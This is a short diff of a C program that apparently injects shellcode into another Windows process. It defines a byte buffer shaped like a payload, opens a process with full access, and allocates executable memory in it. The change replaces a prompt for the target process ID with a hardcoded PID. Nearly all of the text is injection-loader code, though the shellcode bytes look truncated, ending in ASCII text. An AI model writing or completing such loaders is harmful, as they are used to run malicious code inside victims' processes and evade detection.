@@ -17,13 +17,8 @@ int main(int argc, char** argv) {
 	unsigned char buf[] =
 		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
 		"\x6c\x77\x61\x72\x65\x00\x70\x77\x6e\x65\x64\x00";
-
-	// Ask the user to enter process id
-	printf("Enter target process ID: \n");
-	// Get and save the pid the user types
-	int target_pid;
-	scanf_s("%d", &target_pid);
-	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
+	
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4567);
 	LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
 	if (allocated_mem == NULL) {
 
